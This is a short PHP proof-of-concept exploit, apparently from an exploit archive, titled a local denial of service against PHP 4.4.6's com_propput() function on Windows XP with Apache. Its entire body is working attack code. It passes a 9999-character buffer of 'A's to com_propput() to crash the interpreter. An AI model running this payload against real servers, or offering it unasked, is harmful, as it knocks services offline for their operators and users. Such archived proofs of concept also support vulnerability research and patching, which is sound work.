<?php
// ==================================================================================
//
// PHP 4.4.6 com_propput() Local Denial of Service
//
// Tested on WIN XP, Apache, PHP 4.4.6. Local Denial of Service.
//
// Local Denial of Service
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
// http://www.nullbyte.org.il
//
// ==================================================================================
 
$buffer = str_repeat("A", 9999);
com_propput(1, 1, $buffer);
?>
